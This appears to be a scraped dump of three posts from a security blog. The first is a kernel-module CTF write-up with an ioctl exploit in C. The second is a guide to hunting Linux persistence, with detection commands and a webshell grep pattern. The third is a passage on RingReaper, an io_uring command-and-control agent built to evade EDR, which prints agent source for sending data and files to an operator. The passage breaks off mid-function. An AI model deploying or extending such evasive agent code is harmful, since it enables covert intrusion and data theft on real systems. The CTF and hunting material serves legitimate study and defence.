/dev/ioctl_dev crw------- 1 root root 237, 0 Nov 9 16:15 /dev/ioctl_dev Perfect! The device exists with:\nType: Character device (c) Permissions: root only Major number: 237 Minor number: 0 Reverse Engineering the Kernel Module Time to analyze the kernel object (device.ko)! I\u0026rsquo;ll be using binary ninja for this, but Ghidra or IDA work just as well.\nLoading device.ko into binary ninja After loading device.ko into binary ninja and letting it analyze, we can see several interesting functions in the symbol:\nKey functions identified:\nioctl_handler - The main function we need to understand init_module - Module initialization hide - Module hiding functionality cleanup_module - Module cleanup Analyzing ioctl_handler() This is where the magic happens! Let\u0026rsquo;s examine the decompiled code:\nint64_t ioctl_handler() { int64_t rdx_2; int32_t rsi_3; rdx_2 = __fentry__(); void* gsbase; int64_t rax = *(uint64_t*)((char*)gsbase + 0x28); int32_t var_7c; int32_t var_78; if (rsi_3 == 0xc0487213 \u0026amp;\u0026amp; !_copy_from_user(\u0026amp;var_7c, rdx_2, 0x48) \u0026amp;\u0026amp; var_7c == 0x1337dead \u0026amp;\u0026amp; var_78 == 0xcafebabe) { int64_t var_74; __builtin_strncpy(\u0026amp;var_74, \u0026#34;ROOTKIT{fake_flag_for_you}\u0026#34;, 0x1b); _copy_to_user(rdx_2, \u0026amp;var_7c, 0x48); } if (rax == *(uint64_t*)((char*)gsbase + 0x28)) return __x86_return_thunk(); __stack_chk_fail(); } findings:\nioctl Command Check: rsi_3 == 0xc0487213\nThis is the ioctl request number we need to use Buffer Size: _copy_from_user(\u0026amp;var_7c, rdx_2, 0x48)\nExpects exactly 0x48 bytes (72 bytes) Magic Value #1: var_7c == 0x1337dead\nFirst 4 bytes must be 0x1337DEAD Magic Value #2: var_78 == 0xcafebabe\nNext 4 bytes must be 0xCAFEBABE Understanding the init_module() Let\u0026rsquo;s also check how the device gets created:\nint64_t init_module() { __fentry__(); uint32_t rax = __register_chrdev(0, 0, 0x100, \u0026#34;ioctl_dev\u0026#34;, \u0026amp;fops); major = rax; if (rax \u0026gt;= 0) { uint64_t rax_1 = __class_create(\u0026amp;__this_module, \u0026#34;ioctl_class\u0026#34;, \u0026amp;__key.2); ioctl_class = rax_1; if (rax_1 \u0026lt;= -0x1000) { uint64_t rax_3 = device_create(rax_1, 0, (uint64_t)(major \u0026lt;\u0026lt; 0x14), 0, \u0026#34;ioctl_dev\u0026#34;); __key.2 = rax_3; if (rax_3 \u0026lt;= -0x1000) { hide(); _printk(0x400326); } } } return __x86_return_thunk(); } The device_create() call creates our /dev/ioctl_dev device with:\nDevice class: ioctl_class Device name: ioctl_dev Major number: dynamically allocated (237 in our case) After successful creation, it calls hide() to make the module invisible to lsmod.\nWriting the Exploit Now that we understand the requirements, let\u0026rsquo;s write our exploit code!\nThe Exploit Create a 72-byte buffer Write 0x1337DEAD at offset 0 Write 0xCAFEBABE at offset 4 Open /dev/ioctl_dev Call ioctl with command 0xc0487213 Read the flag from the returned buffer exploit.c #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;sys/ioctl.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; #include \u0026lt;string.h\u0026gt; int main() { int fd; char buf[0x48]; uint32_t val1 = 0x1337DEAD; uint32_t val2 = 0xCAFEBABE; memset(buf, 0, sizeof(buf)); *(uint32_t*)buf = val1; *(uint32_t*)(buf + 4) = val2; fd = open(\u0026#34;/dev/ioctl_dev\u0026#34;, O_RDWR); if (fd \u0026lt; 0) { perror(\u0026#34;open\u0026#34;); return 1; } if (ioctl(fd, 0xc0487213, buf) \u0026lt; 0) { perror(\u0026#34;ioctl\u0026#34;); close(fd); return 1; } printf(\u0026#34;Flag: %s\\n\u0026#34;, buf); close(fd); return 0; } Compiling and Running Since we\u0026rsquo;re connected via SSH, we can easily copy the code and compile it:\nroot@hunter:~# gcc exploit.c -o exploit root@hunter:~# ./exploit Flag: ROOTKIT{ioctl_secret_unlocked@1337} Success! We\u0026rsquo;ve captured the flag!\nWhy It Works The exploit works because the kernel module uses the same buffer for both receiving input and sending output. We create a 72-byte buffer (buf[0x48]), write the magic values 0x1337DEAD and 0xCAFEBABE at the beginning using pointer casting ((uint32_t)buf), then open the device and call ioctl() with command 0xc0487213.\nThe kernel validates our magic values with _copy_from_user(), and if they match, uses _copy_to_user() with the same pointer to overwrite our buffer with the flag.\nKey Lessons Learned 1. Check dmesg for Kernel Activity Kernel messages provided crucial information about module loading and potential issues.\n2. Understand ioctl Communication The ioctl interface is a powerful way for userspace to communicate with kernel drivers. Understanding the command numbers and data structures is essential.\n3. Reversing Skills Being comfortable with tools like Ghidra, IDA, or Binary Ninja is crucial for kernel module analysis.\nConclusion This challenge was an excellent introduction to Reversing and you can learn:\nLinux kernel modules Reverse engineering Crafting ioctl requests Recognizing rootkit techniques Our Community Join the Rootkit Researchers community:\nDiscord Server\nChallenge created by Matheuz - Have fun guys!!\nThanks for reading! If you enjoyed this writeup, consider sharing it with others who might find it useful. Happy hacking!\n","permalink":"http://localhost:1313/hacking/ioctl-secrets/","summary":"\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://i.imgur.com/ZTjHU7a.jpeg\" alt=\"img\"  /\u003e\n\u003c/p\u003e\n\u003chr\u003e\n\u003ch2 id=\"challenge-description\"\u003eChallenge Description\u003c/h2\u003e\n\u003cp\u003eIn this challenge, we\u0026rsquo;re given access to a Linux virtual machine (VM) running Ubuntu. The objective is to exploit a custom kernel module to retrieve a hidden flag. The challenge involves reverse engineering, kernel internals, and crafting a proper exploit.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eWhat we have:\u003c/strong\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eA hidden kernel module loaded at boot\u003c/li\u003e\n\u003cli\u003eCharacter device at \u003ccode\u003e/dev/ioctl_dev\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003eSetup script (\u003ccode\u003edevice.sh\u003c/code\u003e) that loads the module and shreds source files\u003c/li\u003e\n\u003cli\u003eSSH access enabled (username: \u003ccode\u003eroot\u003c/code\u003e, password: \u003ccode\u003eioctl\u003c/code\u003e)\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cstrong\u003eImportant Note:\u003c/strong\u003e Many participants had difficulties copy-pasting code directly into the VM console. As stated in the challenge description, \u003cstrong\u003eSSH is enabled\u003c/strong\u003e for easier interaction! This was a common pain point, so let\u0026rsquo;s start by addressing it.\u003c/p\u003e","title":"Ioctl Secrets Writeup"},{"content":" Hello everyone, welcome to this post, where I will cover the topic “Linux Threat Hunting Persistence”.\nThe objective of this post is to learn how to hunt for persistence on Linux machines, without using paid tools/framework, just using the tools that are already available (open source) for anyone to download and use and also using Linux\u0026rsquo;s own resources to be able to do hunt for persistence.\nBelow is what we will cover in this post.\nSSH Keys Crontab Bashrc APT Privileged user \u0026amp; SUID bash Malicious Systemd Hunting LKM Rootkits LD_PRELOAD rootkit PAM Backdoor ACL init.d Motd Mount process for hide any pid. Webshells rc.local But before we start, we need to understand what persistence is.\nWhat is persistence? Persistence in Linux, refers to the ability of malware, such as rootkits, backdoors and we can also abuse common Linux features for malicious uses to remain active on the system even after reboots. These threats seek to maintain unauthorized access and conceal their presence, making them persistent challenges for detection and removal.\nSo now we understand what persistence is, to be able to defend our systems we need to know where to look and how to remove it, so let\u0026rsquo;s go!\nHunting for Malicious SSH Keys It is correct to say that the simplest method of maintaining persistence is using ssh keys, so it is always good before analyzing an infected machine, for example, to see if there is an ssh key that you do not know, you can view it this with just one command line.\nfor home_dir in /home/*; do [ -d \u0026#34;$home_dir/.ssh\u0026#34; ] \u0026amp;\u0026amp; echo \u0026#34;HOME \\\u0026#34;$(basename \u0026#34;$home_dir\u0026#34;)\\\u0026#34;\u0026#34;; [ -d \u0026#34;$home_dir/.ssh\u0026#34; ] \u0026amp;\u0026amp; cat \u0026#34;$home_dir\u0026#34;/.ssh/*; done ls -la -R /home/*/.ssh */.ssh/* With this, the attacker could simply add his public key to the authorized_keys of some home or get the private key, and return to the machine at any time, and whenever he wants without needing a password.\nHunting for crontab persistence. Persistence via crontab is also a very old persistence technique, but it is still used today, basically, crontab allows us to schedule commands, scripts and programs to be executed automatically at regular intervals of time, and with that we can simply schedule a cron to execute a malicious script or some command, below are some examples.\nIn this image we see a classic example of persistence using crontab, where the 5 asterisks represent that our task will be executed every 1 minute, under the root user and then we enter the path of our script.\nPaths for search cron persistence\ncat /etc/crontab ls -la /var/spool/* ls -la -R /var/cron* Hunting for bashrc persistence .bashrc is a script file used in Linux Bash to configure environment variables, aliases, and other terminal customizations. Thinking like an attacker, you could make a malicious alias so that when the victim runs a command, for example the ls command, it sends you a reverse shell, executes a script, among many others.\nYou can search using this command:\ncat /home/*/{.bashrc,.zshrc} ls -la /home/*/{.bashrc,.zshrc} Hunting APT command persistence In short, apt is a program package management system that has automatic resolution of dependencies between packages, easy package installation method, ease of operation, allows you to easily update your distribution, etc.\nBut until then there is nothing \u0026ldquo;malicious\u0026rdquo;, however, apt has a command called apt update, which is for updating packages, and it also has a directory in: /etc/apt/apt.conf.d.\nThe /etc/apt/apt.conf.d directory is used to manage apt specific configurations on the operating system.\nBut what if we can create a malicious configuration to be able to send a reverse shell to us every time someone uses the apt update command, yes, this is totally possible, below are some examples.\nYou can use this command to find and check them one by one.\nls -la -R /etc/apt/apt.conf.d Hunting for Privileged user \u0026amp; SUID bash In a real attack scenario, depending on the attacker can also put SUID permissions on binaries, for example bash to be able to use it with root permission, and also add a user so that he can use sudo su and be root without having to password by changing the file /etc/sudoers.\nScenario 1 Scenario 2 You can check using these commands below:\nfind / -perm /4000 2\u0026gt;/dev/null #for search suid binaries/files ls -la $(whereis bash) ls -la /etc/sudoers.d cat /etc/sudoers cat /etc/groups #Here you can also check if a user is in the wrong group Hunting for malicious systemd service Systemd is a startup and service management system it simplifies system startup and service management.\nA malicious attacker abuses systemd to create a malicious service, for example, to send a reverse shell every 1 minute.\nPersistence by a service in systemd, it is widely used, it is always good to see what services you have on your machine, a tip for this type of situation is to use pspy64 which is basically a real-time process monitor, and when a service in systemd for example is executed, it appears in pspy too, and the same goes for crontab.\nHere are some directories you can check:\nls -la /etc/systemd/system ls -la /lib/systemd/system ls -la /run/systemd/system ls -la /usr/lib/systemd/system ls -la /home/*/.config/systemd/user/ To stop the malicious service, simply run the commands:\nsystemctl stop malicious.service systemctl disable malicious.service rm malicious.service Hunting for Loadable kernel module Rootkits LKM (Loadable kernel module) rootkits are certainly an absurd challenge to hunt, as it simply hides, becomes invisible, and once it is invisible it is almost impossible to remove it, in technical details, rootkits use a function called list_del which basically removes from lsmod (list modules) that is capable of listing the machine\u0026rsquo;s kernel modules, the big problem with this is that rmmod (remove module) is not capable of removing a module that is not in lsmod, so rootkits are very efficient at remaining persistent without anyone being able to detect why this is one of the main objectives of a rootkit, to remain persistent and invisible, but in this part of the post, I will teach you some techniques that can help you find rootkits and detect them, however, as stated above, removing them is a difficult task and depends on the type of rootkit, if it is one you can find on github like for example diamorphine, it has the function of becoming visible again, and then you can remove it.\nAs you can see here, it is invisible and even if it is still in the system, you will not be able to remove it.\nBut diamorphine was also designed to be visible, by default which is by using kill -63 0 and then you can remove it.\nHunting without tools I will use the diamorphine rootkit as an example to do hunting.\nThe most basic thing to do when a rootkit is not in lsmod is to check the kernel log files, such as:\ndmesg /var/log/kern.log /var/log/dmesg* It is very important to view the kernel logs because when an LKM is entered, it generates logs there as well.\nWe can also view: /sys/kernel/tracing/available_filter_functions which is basically a feature in Linux that lists the functions available to filter events during kernel tracing.\nWe can also view all available functions with their respective addresses /sys/kernel/tracing/available_filter_functions_addrs\nIt is also very important that we check the files and commands:\n/proc/modules /proc/kallsyms /lib/modules /proc/* lsmod #to view modules ps aufwx #to view all process in machine ss -tunlpd #to view connections lsof -i -P -n #to view process in execution and file open /proc/*/maps /proc/*/cwd /proc/*/environ Hunting with tools Unhide I\u0026rsquo;ll start using unhide which is a forensic tool to find processes and TCP/UDP ports hidden by rootkits, Linux kernel modules or by other techniques.\nAs we can see in the image above, we hid a PID, and using unhide, we were able to find it.\nRkhunter (rootkit hunter) Rkhunter is a good tool, however it is based on known signatures/strings, that is, if you modify the functions you can easily bypass its detection, you can see this video using the D3m0n1z3dShell tool for this.\nHowever, for known rootkits and if they are inserted by default without any modification, rkhunter can easily detect them, in the case of diamorphine and other rootkits, if it is invisible to lsmod, depending on it it cannot detect it, which is the case with diamorphine, if I make the module visible, it detects it, otherwise it goes unnoticed.\nNow with the rootkit hidden again:\nHere is the log that rkhunter generates, and basically for it to detect if it really is the diamorphine rootkit, it uses signature/strings which is clearly very easy to bypass detection.\nThis is enough to avoid detection.\nAgain, rkhunter is good for rootkits that have not been modified and signature/strings already exist, but still, don\u0026rsquo;t trust it 100%.\nchkrootkit Chkrootkit is a rootkit detection tool on Unix-like systems. It scans the system for signs of malicious activity such as suspicious files, hidden processes, and modifications to system libraries.\nChkrootkit is good at detecting hidden processes and directory as well, but as mentioned on rkhunter, don\u0026rsquo;t trust chkrootkit 100% as it is still possible to avoid detection of an LKM rootkit.\nTracee EBPF Tracee is a runtime security and observability tool that helps you understand how your system and applications behave. Tracee uses eBPF, and it is a great forensics tool, in my opinion it is the best there is for detecting rootkits as well, as it also detects if a syscall has been hooked.\nOBS: To disable LKM insertion you can use sysctl for this:\nsudo sysctl -w kernel.modules_disabled=1 To return it to default, simply change the 1 to 0.\nHere are some talks and posts about tracee detecting LKM rootkits, it\u0026rsquo;s really worth watching!\nDetecting Linux Syscall Hooking Using Tracee\nBlackHat Arsenal 2022: Detecting Linux kernel rootkits with Aqua Tracee\neBPF Warfare - Detecting Kernel \u0026amp; eBPF Rootkits with Tracee\nHunting kernel rootkits with eBPF by Asaf Eitani \u0026amp; Itamar Maouda Kochavi\nBônus tools:\nLynis is a security auditing tool Tiger is a security audit tool #sudo apt install tiger -y Volatily #advanced memory forensics Hunting LD_PRELOAD Rootkits LD_PRELOAD rootkits are easier to hunt down and remove from the machine, because basically besides being Userland, most of them involve the use of shared object (*.so)\nIn this part, I will use a userland rootkit created by h0mbre\nSome LD_PRELOAD rootkits hide from /etc/ld.so.preload but it is possible to find it anyway.\nTo be able to confirm, it is always a good idea to check the binaries with ldd to see which shared objects it has.\nTo remove it, it\u0026rsquo;s very simple.\nAnd that\u0026rsquo;s it, it has already been removed from the machine.\nAs said, userland rootkits are much easier to detect and remove, below are some directories/files that are good to check.\n/lib/x86_64-linux-gnu /lib/* /usr/lib/x86_64-linux-gnu /usr/lib/* ls -la /etc/ld* cat /etc/ld.so.preload ldd /bin/ls ldd /bin/bash ldd /usr/bin/ssh ldd /usr/bin/netstat ldd /bin/* #check for shared object in binary, which you suspect ldd /usr/bin/* #check for shared object in binary, which you suspect /proc/*/maps Using volatily also helps a lot in this analysis process.\nHunting for PAM Backdoor PAM Backdoor is a well-known persistence technique, it works by manipulating the Pluggable Authentication Modules (PAM) authentication system. This allows unauthorized access to the system by granting a specific user privileged access regardless of correct credentials.\nI will use this repository that automates this persistence process.\nNow that the PAM Backdoor has been inserted, let\u0026rsquo;s search for it.\nOne thing we can do to detect something \u0026ldquo;abnormal\u0026rdquo; in it is to use strings, I downloaded a Normal Linux PAM on my machine and compiled it.\nMalicious pam_unix.so Here we\u0026rsquo;ll see in the strings that the password we used is there, called \u0026ldquo;hunt3r\u0026rdquo; on line 376, so we can do the same thing, look on lines 375 to 378 or so and see if there\u0026rsquo;s anything there.\nNormal pam_unix.so And now in the uninfected pam_unix.so, there is nothing interesting in these lines, so in an infected pam_unix.so, if you use the strings and analyze it, you will see the password that is used for unauthorized access\ncat /usr/include/type.h find / -name \u0026#34;pam_unix.so\u0026#34; 2\u0026gt;/dev/null ls -la /lib/security ls -la /usr/lib/security ls -la /lib/x86_64-linux-gnu/security ls -la /etc/pam.d/* Here are two repository links on github that automate persistence, you can read the code and understand it, maybe look for other ways to hunt.\nmadlib\nLinux PAM Backdoor\nHunting for ACL Persistence Just like in Active Directory/Windows, in Linux there is also an ACL, and this can be used to maintain persistence as well.\nIn a scenario where an attacker has compromised one of your Linux machines and knows that at any time he may lose access to the machine or a specific directory/file, he can abuse the ACL (access control list) by using the setfacl command to change Control access to a file or directory for any user you want, with whatever permissions you want.\nNow the user kali can access /root even without being root, because we changed the ACL of the /root directory for the user kali be able to have read, write and execute permissions.\nTo be able to do a hunt, it\u0026rsquo;s very simple, just use the command getfacl which basically displays the access control lists (ACLs) associated with files and directories and then use setfacl -b DIR/FILE for remove ACL.\nWe can also create a simple bash script to run and whatever it finds in ACL it will print on the screen.\n#!/bin/bash users=$(awk -F\u0026#39;:\u0026#39; \u0026#39;$1!=\u0026#34;root\u0026#34; {print $1}\u0026#39; /etc/passwd) check_acl_for_user() { local user=\u0026#34;$1\u0026#34; echo \u0026#34;Checking ACLs for user: $user\u0026#34; acl_output=$(getfacl -R /* | grep \u0026#34;^# file: \\|user:$user$\u0026#34;) if [[ -n \u0026#34;$acl_output\u0026#34; ]]; then echo \u0026#34;$acl_output\u0026#34; fi } for user in $users; do check_acl_for_user \u0026#34;$user\u0026#34; done Hunting init.d persistence init.d are the scripts that are executed at machine startup, that is, as soon as the machine is turned on, the scripts that are on it are executed, and this is like gold for an attacker, as he can simply add a reverse shell payload, or execute any script he wants, as soon as the machine starts/restarts.\nNow after reboot:\nTo remove it is quite simple.\nFor hunting just check these two directories:\nls -la /etc/init.d/* ls -la /etc/rc*.d/ Hunting MOTD Persistence MOTD (Message of the Day) is a message displayed to users when they log into a system, usually through SSH or the console. It is a way of providing important information, such as maintenance notices, usage policies, system news or any other relevant information to users.\nThis persistence technique basically consists of creating a malicious MOTD that when someone join into the machine using ssh for example, our Malicious MOTD will be executed, below is an example of how it works.\nBasically what we did was go to /etc/update-motd.d and create a new MOTD containing the path of a reverse shell script, so that as soon as someone sshs in, the reverse shell will be executed and Regardless of which user you enter, the shell will always be root, as ssh runs as root.\nTo be able to hunt you can check these directories looking for an Abnormal MOTD.\nls -la /etc/update-motd.d/* /usr/lib/update-notifier/update-motd-updates-available cat /etc/motd find / -name \u0026#34;*motd*\u0026#34; 2\u0026gt;/dev/null Hunting for hidden process mounted This technique of using mount to mount a process in another directory is quite old, but it\u0026rsquo;s worth knowing how it works and knowing how to undo it.\nTo be able to hunt, it\u0026rsquo;s very simple, just use the mount command to see what is mounted.\nmount mount|grep proc umount /proc/PID umount -l /proc/PID Hunting for webshells Of course, using webshells for persistence is an old technique. When an attacker gains access to a machine, even without elevated privileges, they can deploy a webshell. A webshell allows the attacker to access the machine, even without direct access to the server via browser/web and from there, the attacker can execute commands and even execute a reverse shell to gain access to the server without depending on the webshell.\nHere we have an example of a simple webshell in PHP.\nWe can detect it using this oneline and with tools too.\ngrep -rlE \u0026#39;fsockopen|pfsockopen|exec|shell|system|eval|rot13|base64|base32|passthru|\\$_GET|\\$_POST\\$_REQUEST|cmd|socket\u0026#39; /var/www/html/*.php | xargs -I {} echo \u0026#34;Suspicious file: {}\u0026#34; We can also look at the apache logs, it also shows what the file was.\nWe can also use tools like BackDoorMan, NeoPI, Shell-Detector and WebShell-AIHunter that help in detecting malicious webshells.\nHunting rc.local persistence rc.local is a startup script in Linux used to execute custom commands or scripts during the system boot process, however it has been replaced by more modern methods such as systemd service units.\nAn attacker could add a reverse shell to /etc/rc.local and every time your machine is started, the content on it will be executed with root privileges, thus providing very good and effective persistence.\nAfter the reboot, the content inside rc.local which was the reverse shell was executed successfully and we can see its process.\nWe can also see when it was run using systemctl status rc-local.\nTo be able to hunt, just check these files and directories:\n/etc/rc.local /lib/systemd/system/rc-local.service.d cat /run/systemd/generator/multi-user.target.wants/rc-local.service systemctl status rc-local So this was the post, I hope you liked it, if you have any questions or if you didn\u0026rsquo;t understand any part, DM me on Twitter: @MatheuzSecurity\nSo that\u0026rsquo;s it, until next time!\n","permalink":"http://localhost:1313/hacking/linux-threat-hunting-persistence/","summary":"\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://i.imgur.com/lM0kWBM.jpeg\" alt=\"imgur\"  /\u003e\n\u003c/p\u003e\n\u003cp\u003eHello everyone, welcome to this post, where I will cover the topic “Linux Threat Hunting Persistence”.\u003c/p\u003e\n\u003cp\u003eThe objective of this post is to learn how to hunt for persistence on Linux machines, without using paid tools/framework, just using the tools that are already available (open source) for anyone to download and use and also using Linux\u0026rsquo;s own resources to be able to do hunt for persistence.\u003c/p\u003e\n\u003cp\u003eBelow is what we will cover in this post.\u003c/p\u003e","title":"Linux Threat Hunting Persistence"},{"content":"Full source: https://github.com/MatheuZSecurity/RingReaper\nTable of Contents Introduction What is io_uring? The Agent Code Analysis How Does the EDR Typically Fail Here? Practical EDR Bypass Python C2 Server Flow Defensive Reflections Conclusion Introduction Each year, new security solutions emerge to protect Linux systems against increasingly sophisticated threats. Technologies such as EDR (Endpoint Detection and Response) evolve rapidly, making the work of an attacker more challenging.\nWe, as red teamers, we need to stay one step ahead, seeking to understand not only the defenses, but also how to creatively circumvent them.\nIn this article, I will explore the use of io_uring, a legitimate Linux kernel feature designed for high-performance asynchronous I/O, but which can be adapted to evade traditional syscall-based detection mechanisms. We will see how modern techniques can enable stealthy and silent operations, bypassing EDR and other monitoring mechanisms, and what this means for both attackers and defenders.\nWhat is io_uring? io_uring was introduced in Linux starting from kernel 5.1. It provides a highly performant model for asynchronous I/O operations, using submission and completion rings. In other words:\nThe process places I/O requests into a queue shared with the kernel The kernel executes them when it can, without blocking the user thread The result comes back through another completion ring The critical point is that this model allows for multiple operations (opening a file, sending data, reading from a socket, etc.) without the typical sequence of blocking syscalls that most EDRs monitor. Instead of repeatedly calling read, write, send, connect, everything happens through io_uring_submit() and mapped buffers.\nThe Agent This agent essentially acts as a \u0026ldquo;backdoor\u0026rdquo;, though it\u0026rsquo;s not persistent yet, at the time of writing, persistence modules haven\u0026rsquo;t been implemented. However, they will be added in the future. The agent connects to a server (C2) controlled by the attacker and accepts commands. It was designed with:\nNetwork communication using io_uring_prep_send and io_uring_prep_recv File reading via io_uring_prep_openat and io_uring_prep_read File upload without explicit write or read syscalls Post-exploitation command execution (listing users, processes, connections, etc.) Self-deletion (self-destruct) that removes its own binary using io_uring_prep_unlinkat On the Python-based C2 server, an operator sends interactive commands, and the agent responds discreetly.\nCode analysis of the agent send_all\nint send_all(struct io_uring *ring, int sockfd, const char *buf, size_t len) { size_t sent = 0; while (sent \u0026lt; len) { struct io_uring_sqe *sqe = io_uring_get_sqe(ring); io_uring_prep_send(sqe, sockfd, buf + sent, len - sent, 0); io_uring_submit(ring); struct io_uring_cqe *cqe; io_uring_wait_cqe(ring, \u0026amp;cqe); int ret = cqe-\u0026gt;res; io_uring_cqe_seen(ring, cqe); if (ret \u0026lt;= 0) return ret; sent += ret; } return sent; } This function ensures that a complete buffer is sent by a socket using asynchronous io_uring calls, in a way that is robust against partial sends. It works in a loop that continues until all requested bytes have been sent. For each iteration, it obtains an SQE (Submission Queue Entry) from io_uring, prepares a send (io_uring_prep_send) from the point not yet transmitted in the buffer, submits the operation, and waits for the result in the Completion Queue.\nUpon receiving confirmation from the kernel, it checks whether there was an error or whether the socket was closed (return zero or negative). If there was no error, it adds the sent bytes to the total and repeats until finished.\nThe goal is to abstract the normal limitations of the traditional send (which can send only part of the data) and perform the complete send with the minimum of blocking calls, taking advantage of the asynchronous and efficient io_uring model.\nrecv_all:\nssize_t recv_all(struct io_uring *ring, int sockfd, char *buf, size_t len) { struct io_uring_sqe *sqe = io_uring_get_sqe(ring); struct io_uring_cqe *cqe; io_uring_prep_recv(sqe, sockfd, buf, len, 0); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026amp;cqe); ssize_t ret = cqe-\u0026gt;res; io_uring_cqe_seen(ring, cqe); return ret; } This function reads data from a socket, also using io_uring asynchronously. Unlike send_all, it only reads once per call, since a recv is usually enough to receive the entire expected packet, without worrying about ensuring that the entire buffer has been filled.\nIt obtains the SQE, configures the receive operation (io_uring_prep_recv) with the buffer size, submits it to the kernel, and waits for the result via Completion Queue.\nIt then marks the CQE as processed and returns the number of bytes received to the caller. Thus, the function integrates data reception into the same asynchronous queue, maintaining high performance without blocking the thread.\nread_file_uring:\nThis function encapsulates the reading of an entire file using asynchronous io_uring operations, without relying on traditional blocking calls. It first opens the file with io_uring_prep_openat, waits for the result, and if successful, enters a loop to read chunks of the file in successive blocks, using io_uring_prep_read.\nEach block read is accumulated in a buffer, and the offset advances as it progresses. Reading continues until the buffer is full or until it reaches the end of the file (returning zero or negative on read). Finally, it closes the file and returns the total bytes loaded. It is a useful function to bring entire files into memory in a non-blocking way, always taking advantage of io_uring.\ncmd_users:\nvoid cmd_users(struct io_uring *ring, int sockfd) { char buf[8192]; int ret = read_file_uring(ring, \u0026#34;/var/run/utmp\u0026#34;, buf, sizeof(buf)); if (ret \u0026lt;= 0) { const char *err = \u0026#34;Error reading /var/run/utmp\\n\u0026#34;; send_all(ring, sockfd, err, strlen(err)); return; } int count = ret / sizeof(struct utmp); struct utmp *entries = (struct utmp*)buf; char out[8192]; size_t out_pos = 0; out_pos += snprintf(out + out_pos, sizeof(out) - out_pos, \u0026#34;Logged users:\\n\u0026#34;); for (int i = 0; i \u0026lt; count; i++) { if (entries[i].ut_type == USER_PROCESS) { out_pos += snprintf(out + out_pos, sizeof(out) - out_pos, \u0026#34;%-8s %-8s\\n\u0026#34;, entries[i].ut_user, entries[i].ut_line); if (out_pos \u0026gt; sizeof(out) - 100) break; } } send_all(ring, sockfd, out, out_pos); } This function implements the users command, listing the users logged into the system. It reads the /var/run/utmp file (where Linux stores login sessions) via read_file_uring, parses the USER_PROCESS records, extracts usernames and their TTYs (terminals), formats a list and sends it back to the client via send_all. It is a way to show who is logged in, remotely and asynchronously.\ncmd_ss:\nvoid cmd_ss(struct io_uring *ring, int sockfd) { char buf[8192]; int ret = read_file_uring(ring, \u0026#34;/proc/net/tcp\u0026#34;, buf, sizeof(buf)); if (ret \u0026lt;= 0) { const char *err = \u0026#34;Error reading /proc/net/tcp\\n\u0026#34;; send_all(ring, sockfd, err, strlen(err)); return; } char out[16384]; size_t out_pos = 0; out_pos += snprintf(out + out_pos, sizeof(out) - out_pos, \u0026#34;Local Address Remote Address State UID\\n\u0026#34;); char *line = strtok(buf, \u0026#34;\\n\u0026#34;); line = strtok(NULL, \u0026#34;\\n\u0026#34;); while (line) { unsigned int sl, local_ip, local_port, rem_ip, rem_port, st, uid; sscanf(line, \u0026#34;%u: %8X:%X %8X:%X %X %*s %*s %*s %u\u0026#34;, \u0026amp;sl, \u0026amp;local_ip, \u0026amp;local_port, \u0026amp;rem_ip, \u0026amp;rem_port, \u0026amp;st, \u0026amp;uid); char local_str[32], rem_str[32]; snprintf(local_str, sizeof(local_str), \u0026#34;%d.%d.%d.%d:%d\u0026#34;, (local_ip \u0026amp; 0xFF), (local_ip \u0026gt;\u0026gt; 8) \u0026amp; 0xFF, (local_ip \u0026gt;\u0026gt; 16) \u0026amp; 0xFF, (local_ip \u0026gt;\u0026gt; 24) \u0026amp; 0xFF, local_port); snprintf(rem_str, sizeof(rem_str), \u0026#34;%d.%d.%d.%d:%d\u0026#34;, (rem_ip \u0026amp; 0xFF), (rem_ip \u0026gt;\u0026gt; 8) \u0026amp; 0xFF, (rem_ip \u0026gt;\u0026gt; 16) \u0026amp; 0xFF, (rem_ip \u0026gt;\u0026gt; 24) \u0026amp; 0xFF, rem_port); out_pos += snprintf(out + out_pos, sizeof(out) - out_pos, \u0026#34;%-22s %-22s %-5X %u\\n\u0026#34;, local_str, rem_str, st, uid); if (out_pos \u0026gt; sizeof(out) - 100) break; line = strtok(NULL, \u0026#34;\\n\u0026#34;); } send_all(ring, sockfd, out, out_pos); } The cmd_ss function provides a sort of mini-netstat, reading /proc/net/tcp to collect active TCP connections. It skips the first line header and processes the rest via sscanf, converting hexadecimal addresses to decimal notation, displaying the IP, port, connection state, and UID of the socket owner. The final output is formatted as text and sent to the client with send_all, all in a way that looks like the real Linux ss command, but using asynchronous kernel file reading.\ncmd_get;\nvoid cmd_get(struct io_uring *ring, int sockfd, const char *path) { struct io_uring_sqe *sqe; struct io_uring_cqe *cqe; int fd; sqe = io_uring_get_sqe(ring); io_uring_prep_openat(sqe, AT_FDCWD, path, O_RDONLY, 0); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026amp;cqe); fd = cqe-\u0026gt;res; io_uring_cqe_seen(ring, cqe); if (fd \u0026lt; 0) { char err[256]; snprintf(err, sizeof(err), \u0026#34;Failed to open %s: %s\\n\u0026#34;, path, strerror(-fd)); send_all(ring, sockfd, err, strlen(err)); return; } char buf[BUF_SIZE]; ssize_t ret; off_t offset = 0; while (1) { sqe = io_uring_get_sqe(ring); io_uring_prep_read(sqe, fd, buf, sizeof(buf), offset); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026amp;cqe); ret = cqe-\u0026gt;res; io_uring_cqe_seen(ring, cqe); if (ret \u0026lt;= 0) break; offset += ret; if (send_all(ring, sockfd, buf, ret) \u0026lt;= 0) { break; } } close(fd); } cmd_get is used to transfer files from the server to the client. It tries to open the specified path, and if successful, it reads blocks from the file with io_uring_prep_read and sends these blocks sequentially to the client with send_all. If it fails to open, it sends the client an error message. It is a way to download files from the server remotely.\ncmd_recv:\nvoid cmd_recv(struct io_uring *ring, int sockfd, const char *args) { char remote_path[256]; long expected_size = 0; char buf[BUF_SIZE]; if (sscanf(args, \u0026#34;%255s %ld\u0026#34;, remote_path, \u0026amp;expected_size) != 2 || expected_size \u0026lt;= 0) { const char *msg = \u0026#34;Usage: recv \u0026lt;remote_path\u0026gt; \u0026lt;size\u0026gt;\\n\u0026#34;; send_all(ring, sockfd, msg, 